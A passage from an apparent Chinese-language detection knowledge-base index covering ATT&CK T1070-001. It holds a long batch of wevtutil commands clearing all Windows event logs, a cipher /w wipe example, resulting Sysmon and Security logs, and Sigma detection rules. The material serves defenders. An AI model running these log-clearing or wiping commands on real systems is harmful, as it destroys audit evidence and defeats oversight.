\"ACEEventLog\"\nwevtutil.exe cl \"Application\"\nwevtutil.exe cl \"HardwareEvents\"\nwevtutil.exe cl \"Internet Explorer\"\nwevtutil.exe cl \"Key Management Service\"\nwevtutil.exe cl \"Media Center\"\nwevtutil.exe cl \"Microsoft-Windows-API-Tracing/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-AppID/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-Application-Experience/Problem-Steps-Recorder\"\nwevtutil.exe cl \"Microsoft-Windows-Application-Experience/Program-Compatibility-Assistant\"\nwevtutil.exe cl \"Microsoft-Windows-Application-Experience/Program-Compatibility-Troubleshooter\"\nwevtutil.exe cl \"Microsoft-Windows-Application-Experience/Program-Inventory\"\nwevtutil.exe cl \"Microsoft-Windows-Application-Experience/Program-Telemetry\"\nwevtutil.exe cl \"Microsoft-Windows-AppLocker/EXE and DLL\"\nwevtutil.exe cl \"Microsoft-Windows-AppLocker/MSI and Script\"\nwevtutil.exe cl \"Microsoft-Windows-Audio/CaptureMonitor\"\nwevtutil.exe cl \"Microsoft-Windows-Audio/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-Authentication User Interface/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-Backup\"\nwevtutil.exe cl \"Microsoft-Windows-BitLocker-DrivePreparationTool/Admin\"\nwevtutil.exe cl \"Microsoft-Windows-BitLocker-DrivePreparationTool/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-Bits-Client/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-Bluetooth-MTPEnum/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-BranchCache/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-BranchCacheSMB/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-CodeIntegrity/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-CorruptedFileRecovery-Client/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-CorruptedFileRecovery-Server/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-DateTimeControlPanel/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-DeviceSync/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-Dhcp-Client/Admin\"\nwevtutil.exe cl \"Microsoft-Windows-DhcpNap/Admin\"\nwevtutil.exe cl \"Microsoft-Windows-Dhcpv6-Client/Admin\"\nwevtutil.exe cl \"Microsoft-Windows-Diagnosis-DPS/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-Diagnosis-PCW/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-Diagnosis-PLA/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-Diagnosis-Scheduled/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-Diagnosis-Scripted/Admin\"\nwevtutil.exe cl \"Microsoft-Windows-Diagnosis-Scripted/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-Diagnosis-ScriptedDiagnosticsProvider/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-Diagnostics-Networking/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-Diagnostics-Performance/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-DiskDiagnostic/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-DiskDiagnosticDataCollector/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-DiskDiagnosticResolver/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-DriverFrameworks-UserMode/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-EapHost/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-EventCollector/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-Fault-Tolerant-Heap/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-FMS/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-Folder Redirection/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-Forwarding/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-GroupPolicy/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-Help/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-HomeGroup Control Panel/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-HomeGroup Listener Service/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-HomeGroup Provider Service/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-IKE/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-International/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-International-RegionalOptionsControlPanel/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-Iphlpsvc/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-Kernel-EventTracing/Admin\"\nwevtutil.exe cl \"Microsoft-Windows-Kernel-Power/Thermal-Operational\"\nwevtutil.exe cl \"Microsoft-Windows-Kernel-StoreMgr/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-Kernel-WDI/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-Kernel-WHEA/Errors\"\nwevtutil.exe cl \"Microsoft-Windows-Kernel-WHEA/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-Known Folders API Service\"\nwevtutil.exe cl \"Microsoft-Windows-LanguagePackSetup/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-MCT/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-MemoryDiagnostics-Results/Debug\"\nwevtutil.exe cl \"Microsoft-Windows-MUI/Admin\"\nwevtutil.exe cl \"Microsoft-Windows-MUI/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-NCSI/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-NetworkAccessProtection/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-NetworkAccessProtection/WHC\"\nwevtutil.exe cl \"Microsoft-Windows-NetworkLocationWizard/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-NetworkProfile/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-NlaSvc/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-NTLM/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-OfflineFiles/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-ParentalControls/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-PeopleNearMe/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-PowerShell/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-PrintService/Admin\"\nwevtutil.exe cl \"Microsoft-Windows-ReadyBoost/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-ReadyBoostDriver/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-Recovery/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-ReliabilityAnalysisComponent/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-RemoteApp and Desktop Connections/Admin\"\nwevtutil.exe cl \"Microsoft-Windows-RemoteAssistance/Admin\"\nwevtutil.exe cl \"Microsoft-Windows-RemoteAssistance/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-Resource-Exhaustion-Detector/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-Resource-Exhaustion-Resolver/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-Resource-Leak-Diagnostic/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-RestartManager/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-Security-Audit-Configuration-Client/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-TerminalServices-LocalSessionManager/Admin\"\nwevtutil.exe cl \"Microsoft-Windows-TerminalServices-LocalSessionManager/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-TerminalServices-PnPDevices/Admin\"\nwevtutil.exe cl \"Microsoft-Windows-TerminalServices-PnPDevices/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-TerminalServices-RDPClient/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-TerminalServices-RemoteConnectionManager/Admin\"\nwevtutil.exe cl \"Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-TZUtil/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-UAC/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-UAC-FileVirtualization/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-User Profile Service/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-VDRVROOT/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-VHDMP/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-WER-Diag/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-WFP/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-Windows Defender/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-Windows Defender/WHC\"\nwevtutil.exe cl \"Microsoft-Windows-Windows Firewall With Advanced Security/ConnectionSecurity\"\nwevtutil.exe cl \"Microsoft-Windows-Windows Firewall With Advanced Security/Firewall\"\nwevtutil.exe cl \"Microsoft-Windows-WindowsBackup/ActionCenter\"\nwevtutil.exe cl \"Microsoft-Windows-WindowsSystemAssessmentTool/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-WindowsUpdateClient/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-Winlogon/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-WinRM/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-Winsock-WS2HELP/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-Wired-AutoConfig/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-WLAN-AutoConfig/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-WPD-ClassInstaller/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-WPD-CompositeClassDriver/Operational\"\nwevtutil.exe cl \"Microsoft-Windows-WPD-MTPClassDriver/Operational\"\nwevtutil.exe cl \"ODiag\"\nwevtutil.exe cl \"OSession\"\nwevtutil.exe cl \"Security\"\nwevtutil.exe cl \"Setup\"\nwevtutil.exe cl \"System\"\nwevtutil.exe cl \"Windows PowerShell\"\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E4%BD%BF%E7%94%A8wevtutil%E5%91%BD%E4%BB%A4%E5%88%A0%E9%99%A4%E6%97%A5%E5%BF%97/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows sysmon</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E4%BD%BF%E7%94%A8wevtutil%E5%91%BD%E4%BB%A4%E5%88%A0%E9%99%A4%E6%97%A5%E5%BF%97/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<pre><code>C:\\Windows\\system32&gt;wevtutil cl security\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E4%BD%BF%E7%94%A8wevtutil%E5%91%BD%E4%BB%A4%E5%88%A0%E9%99%A4%E6%97%A5%E5%BF%97/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E4%BD%BF%E7%94%A8wevtutil%E5%91%BD%E4%BB%A4%E5%88%A0%E9%99%A4%E6%97%A5%E5%BF%97/#sysmon_log","title":"sysmon_log","text":"<pre><code>Process Create:\nRuleName: -\nUtcTime: 2020-11-29 13:15:07.077\nProcessGuid: {bb1f7c32-9edb-5fc3-8100-000000001900}\nProcessId: 1908\nImage: C:\\Windows\\System32\\wevtutil.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Eventing Command Line Utility\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: wevtutil.exe\nCommandLine: wevtutil  cl security\nCurrentDirectory: C:\\Windows\\system32\\\nUser: 12306Br0-PC\\12306Br0\nLogonGuid: {bb1f7c32-7b3c-5fc3-f960-060000000000}\nLogonId: 0x660f9\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: SHA1=BDCF4B78B6D6F45EDC9D226CE05B7ADC3B366248\nParentProcessGuid: {bb1f7c32-7b69-5fc3-5000-000000001900}\nParentProcessId: 3328\nParentImage: C:\\Windows\\System32\\cmd.exe\nParentCommandLine: \"C:\\Windows\\System32\\cmd.exe\" \n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E4%BD%BF%E7%94%A8wevtutil%E5%91%BD%E4%BB%A4%E5%88%A0%E9%99%A4%E6%97%A5%E5%BF%97/#windows_security_log","title":"windows_security_log","text":"<pre><code>\u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002\n\n\u4f7f\u7528\u8005:\n \u5b89\u5168 ID:  12306Br0-PC\\12306Br0\n \u5e10\u6237\u540d\u79f0:  12306Br0\n \u5e10\u6237\u57df:  12306Br0-PC\n \u767b\u5f55 ID:  0x660f9\n\n\u8fdb\u7a0b\u4fe1\u606f:\n \u65b0\u8fdb\u7a0b ID:  0x774\n \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\wevtutil.exe\n \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: TokenElevationTypeFull (2)\n \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0xd00\n \u8fdb\u7a0b\u547d\u4ee4\u884c:   #\u672a\u5f00\u542f\u8bb0\u5f55\u547d\u4ee4\u884c\u53c2\u6570\u5ba1\u6838\uff0c\u6240\u4ee5\u6b64\u5904\u4e3a\u7a7a\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E4%BD%BF%E7%94%A8wevtutil%E5%91%BD%E4%BB%A4%E5%88%A0%E9%99%A4%E6%97%A5%E5%BF%97/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E4%BD%BF%E7%94%A8wevtutil%E5%91%BD%E4%BB%A4%E5%88%A0%E9%99%A4%E6%97%A5%E5%BF%97/#sigma","title":"sigma","text":"<pre><code>title: windows \u65e5\u5fd7\u6e05\u9664\ndescription: win7\u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u200b    product: windows\n\u200b    service: security\ndetection:\n\u200b    selection1:\n\u200b        EventID:\n\u200b                - 1 #sysmon\n\u200b                - 4688 #Windows \u5b89\u5168\u65e5\u5fd7\n        Process.name: 'wevtutil.exe' #Application Name\n  Commanline: 'cl'\n selection2:\n  Process.name: 'powershell.exe' #Application Name\n  Commanline: 'Clear-EventLog'\n\u200b    condition: selection1 OR selection2\nlevel: medium\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E4%BD%BF%E7%94%A8wevtutil%E5%91%BD%E4%BB%A4%E5%88%A0%E9%99%A4%E6%97%A5%E5%BF%97/#_6","title":"\u5efa\u8bae","text":"<p>\u5982\u679c\u4f60\u60f3\u57fa\u4e8ewindows\u65e5\u5fd7\u8fdb\u884c\u68c0\u6d4b\uff0c\u90a3\u4e48\u4f60\u9700\u8981\u7559\u610f\u5728\u4ea7\u751f\u4e861102\uff08\u65e5\u5fd7\u6e05\u9664\uff09\u540e\uff0cwevtutil\u8fdb\u7a0b\uff084688/4689\uff09\u7684\u8c03\u7528\u60c5\u51b5\u3002\u81f3\u5c11\uff0c\u5b83\u5728\u6211\u7684\u6d4b\u8bd5\u73af\u5883\u4e2d\u662f\u8fd9\u4e48\u8868\u73b0\u7684\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E4%BD%BF%E7%94%A8wevtutil%E5%91%BD%E4%BB%A4%E5%88%A0%E9%99%A4%E6%97%A5%E5%BF%97/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1070-001</p> <p>https://attack.mitre.org/techniques/T1070/001/</p> <p>powershell:Clear-EventLog</p> <p>https://blog.csdn.net/weixin_30800807/article/details/97087311</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%A3%80%E6%B5%8Bcipher.exe%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE/","title":"T1070-001-win-\u68c0\u6d4bcipher.exe\u5220\u9664\u6570\u636e","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%A3%80%E6%B5%8Bcipher.exe%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u963b\u6b62\u7531\u76d1\u6d4b\u8f6f\u4ef6\u6216\u8fdb\u7a0b\u6355\u83b7\u5230\u7684\u544a\u8b66\uff0c\u4ee5\u53ca\u4e8b\u4ef6\u65e5\u5fd7\u88ab\u6536\u96c6\u548c\u5206\u6790\u3002\u8fd9\u53ef\u80fd\u5305\u62ec\u4fee\u6539\u914d\u7f6e\u6587\u4ef6\u6216\u6ce8\u518c\u8868\u9879\u4e2d\u7684\u76d1\u6d4b\u8f6f\u4ef6\u7684\u8bbe\u7f6e\uff0c\u4ee5\u8fbe\u5230\u9003\u907f\u8ffd\u8e2a\u7684\u76ee\u7684\u3002</p> <p>\u5728\u57fa\u4e8e\u7279\u5f81\u76d1\u6d4b\u7684\u60c5\u51b5\u4e0b\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u963b\u6b62\u76d1\u6d4b\u7279\u5f81\u76f8\u5173\u7684\u6570\u636e\u88ab\u53d1\u9001\u51fa\u53bb\uff0c\u4ee5\u4fbf\u4e8e\u963b\u6b62\u5b89\u5168\u4eba\u5458\u8fdb\u884c\u5206\u6790\u3002\u8fd9\u53ef\u4ee5\u6709\u5f88\u591a\u65b9\u5f0f\u5b9e\u73b0\uff0c\u4f8b\u5982\u505c\u6b62\u8d1f\u8d23\u8f6c\u53d1\u7684\u8fdb\u7a0b\uff08splunk\u8f6c\u53d1\u5668\u3001Filebate\u3001rsyslog\u7b49\uff09\u3002</p> <p>\u5728\u6b63\u5e38\u7684\u64cd\u4f5c\u671f\u95f4\u5185\uff0c\u4e8b\u4ef6\u65e5\u5fd7\u4e0d\u592a\u53ef\u80fd\u4f1a\u88ab\u523b\u610f\u6e05\u9664\u3002\u4f46\u662f\u6076\u610f\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u6e05\u9664\u4e8b\u4ef6\u65e5\u5fd7\u6765\u5c1d\u8bd5\u63a9\u76d6\u81ea\u5df1\u7684\u8e2a\u8ff9\u3002\u5f53\u4e8b\u4ef6\u65e5\u5fd7\u88ab\u6e05\u9664\u65f6\uff0c\u5b83\u662f\u53ef\u7591\u7684\u3002\u53d1\u73b0\u201c\u6e05\u9664\u4e8b\u4ef6\u65e5\u5fd7\u201d\u65f6\u53ef\u80fd\u610f\u5473\u7740\u6709\u6076\u610f\u653b\u51fb\u8005\u5229\u7528\u4e86\u6b64\u9879\u6280\u672f\u3002</p> <p>\u96c6\u4e2d\u6536\u96c6\u4e8b\u4ef6\u65e5\u5fd7\u7684\u4e00\u4e2a\u597d\u5904\u5c31\u662f\u4f7f\u653b\u51fb\u8005\u66f4\u96be\u4ee5\u63a9\u76d6\u4ed6\u4eec\u7684\u8e2a\u8ff9\uff0c\u4e8b\u4ef6\u8f6c\u53d1\u5141\u8bb8\u5c06\u6536\u96c6\u5230\u7684\u7cfb\u7edf\u4e8b\u4ef6\u65e5\u5fd7\u53d1\u9001\u7ed9\u591a\u4e2a\u6536\u96c6\u5668\uff08splunk\u3001elk\u7b49\uff09\uff0c\u4ece\u800c\u5b9e\u73b0\u5197\u4f59\u4e8b\u4ef6\u6536\u96c6\u3002\u4f7f\u7528\u5197\u4f59\u4e8b\u4ef6\u6536\u96c6\uff0c\u53ef\u4ee5\u6700\u5927\u9650\u5ea6\u7684\u5e2e\u52a9\u6211\u4eec\u53d1\u73b0\u5a01\u80c1\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%A3%80%E6%B5%8Bcipher.exe%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u5728windows 2000\u4ee5\u4e0a\u7248\u672c\u90fd\u5185\u7f6e\u4e86\u4e00\u4e2a\u8fd9\u6837\u7684\u5de5\u5177\u2014\u2014cipher.exe\u3002cipher\u4f7f\u7528\u65b9\u6cd5\u5f88\u7b80\u5355\uff0c\u5728\u547d\u4ee4\u884c\u7a97\u53e3\u4e2d\uff0c\u952e\u5165\uff1a cipher /w:\u76d8\u7b26:/\u76ee\u5f55</p> <p>\u5176\u4e2d\uff0c\u76ee\u5f55\u662f\u53ef\u9009\u7684\uff0c\u7528\u4e8e\u5377\u6302\u63a5\u70b9\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u53ea\u5199\u78c1\u76d8\u76d8\u7b26\u5c31\u884c\u4e86\u3002\u6bd4\u5982\u6e05\u9664e\u76d8\uff0c\u5c31\u7528\u201ccipher /w:e\u201d\u3002</p> <p>\u547d\u4ee4\u5f00\u59cb\u8fd0\u884c\u540e\uff0c\u4f1a\u4f9d\u6b21\u75280x00\u3001 0xff\u548c\u968f\u610f\u6570\u5b57\u8986\u76d6\u8be5\u5206\u533a\u4e2d\u7684\u5168\u90e8\u7a7a\u95f2\u7a7a\u95f4\uff0c\u80fd\u591f\u6d88\u9664\u4efb\u4f55\u5df2\u5220\u9664\u6587\u4ef6\u7684\u75d5\u8ff9\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%A3%80%E6%B5%8Bcipher.exe%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7/sysmon\u65e5\u5fd7</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%A3%80%E6%B5%8Bcipher.exe%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<pre><code>\u6d4b\u8bd5\u73af\u5883\uff1awindows server 2016\n\n\u6d4b\u8bd5\u547d\u4ee4\uff1a C:\\Users\\123&gt;cipher /w:C:/Users/123/Desktop/test \n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%A3%80%E6%B5%8Bcipher.exe%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%A3%80%E6%B5%8Bcipher.exe%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE/#windows_security_log","title":"windows_security_log","text":"<pre><code>4688\uff0c\u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002\n\n\u521b\u5efa\u8005\u4e3b\u9898:\n \u5b89\u5168 ID:  361A\\12306br0\n \u5e10\u6237\u540d:  12306br0\n \u5e10\u6237\u57df:  361A\n \u767b\u5f55 ID:  0x507DC\n\n\u76ee\u6807\u4e3b\u9898:\n \u5b89\u5168 ID:  NULL SID\n \u5e10\u6237\u540d:  -\n \u5e10\u6237\u57df:  -\n \u767b\u5f55 ID:  0x0\n\n\u8fdb\u7a0b\u4fe1\u606f:\n \u65b0\u8fdb\u7a0b ID:  0x11e0\n \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cipher.exe\n \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: %%1938\n \u5f3a\u5236\u6027\u6807\u7b7e:  Mandatory Label\\Medium Mandatory Level\n \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0x10f0\n \u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cmd.exe\n \u8fdb\u7a0b\u547d\u4ee4\u884c: cipher  /w:C:/Users/12306br0/Desktop/test #\u9700\u8981\u5355\u72ec\u914d\u7f6e\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%A3%80%E6%B5%8Bcipher.exe%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%A3%80%E6%B5%8Bcipher.exe%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE/#sigma","title":"sigma","text":"<pre><code>title: \u68c0\u6d4bcipher.exe\u5220\u9664\u6570\u636e\ndescription: windows server 2016\u6a21\u62df\u6d4b\u8bd5\u3002\u8be5\u68c0\u6d4b\u65b9\u5f0f\u6765\u6e90\u4e8eMicrosoft 365 Defender\u5a01\u80c1\u60c5\u62a5\u56e2\u961f\u5a01\u80c1\u5206\u6790\u62a5\u544a\u4e2d\uff0c\u52d2\u7d22\u8f6f\u4ef6\u7ee7\u7eed\u51b2\u51fb\u533b\u7597\u4fdd\u5065\u548c\u5173\u952e\u670d\u52a1\u3002\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u200b    product: windows\n\u200b    service: security\ndetection:\n\u200b    selection:\n\u200b        EventID:\n\u200b                - 1 #sysmon\u65e5\u5fd7\n\u200b                - 4688 #Windows \u5b89\u5168\u65e5\u5fd7\n        Process_name: 'cipher.exe' #Application Name\n    Commanline: '/w'\n\u200b    condition: selection\nlevel: medium\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%A3%80%E6%B5%8Bcipher.exe%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE/#_6","title":"\u5efa\u8bae","text":"<p>\u5982\u679c\u57fa\u4e8ewindows\u5b89\u5168\u65e5\u5fd7\u8fdb\u884c\u68c0\u6d4b\uff0c\u9700\u8981\u6ce8\u610f\u64cd\u4f5c\u7cfb\u7edf\u7248\u672c\u95ee\u9898\uff0c\u90e8\u5206\u64cd\u4f5c\u7cfb\u7edf\u5e76\u4e0d\u652f\u6301\u5f00\u542f\u5ba1\u6838\u8fc7\u7a0b\u521b\u5efa\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%A3%80%E6%B5%8Bcipher.exe%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1070-001</p> <p>https://attack.mitre.org/techniques/T1070/001/</p> <p>\u52d2\u7d22\u8f6f\u4ef6\u7ec4\u7ec7\u7ee7\u7eed\u4ee5\u533b\u7597\u4fdd\u5065\uff0c\u5173\u952e\u670d\u52a1\u4e3a\u76ee\u6807\u2014\u2014Microsoft 365 Defender\u5a01\u80c1\u60c5\u62a5\u56e2\u961f</p> <p>https://www.microsoft.com/security/blog/2020/04/28/ransomware-groups-continue-to-target-healthcare-critical-services-heres-how-to-reduce-risk/</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%B8%85%E9%99%A4%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97/","title":"T1070-001-windows-\u6e05\u9664\u4e8b\u4ef6\u65e5\u5fd7","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%B8%85%E9%99%A4%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u963b\u6b62\u7531\u76d1\u6d4b\u8f6f\u4ef6\u6216\u8fdb\u7a0b\u6355\u83b7\u5230\u7684\u544a\u8b66\uff0c\u4ee5\u53ca\u4e8b\u4ef6\u65e5\u5fd7\u88ab\u6536\u96c6\u548c\u5206\u6790\u3002\u8fd9\u53ef\u80fd\u5305\u62ec\u4fee\u6539\u914d\u7f6e\u6587\u4ef6\u6216\u6ce8\u518c\u8868\u9879\u4e2d\u7684\u76d1\u6d4b\u8f6f\u4ef6\u7684\u8bbe\u7f6e\uff0c\u4ee5\u8fbe\u5230\u9003\u907f\u8ffd\u8e2a\u7684\u76ee\u7684\u3002</p> <p>\u5728\u57fa\u4e8e\u7279\u5f81\u76d1\u6d4b\u7684\u60c5\u51b5\u4e0b\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u963b\u6b62\u76d1\u6d4b\u7279\u5f81\u76f8\u5173\u7684\u6570\u636e\u88ab\u53d1\u9001\u51fa\u53bb\uff0c\u4ee5\u4fbf\u4e8e\u963b\u6b62\u5b89\u5168\u4eba\u5458\u8fdb\u884c\u5206\u6790\u3002\u8fd9\u53ef\u4ee5\u6709\u5f88\u591a\u65b9\u5f0f\u5b9e\u73b0\uff0c\u4f8b\u5982\u505c\u6b62\u8d1f\u8d23\u8f6c\u53d1\u7684\u8fdb\u7a0b\uff08splunk\u8f6c\u53d1\u5668\u3001Filebate\u3001rsyslog\u7b49\uff09\u3002</p> 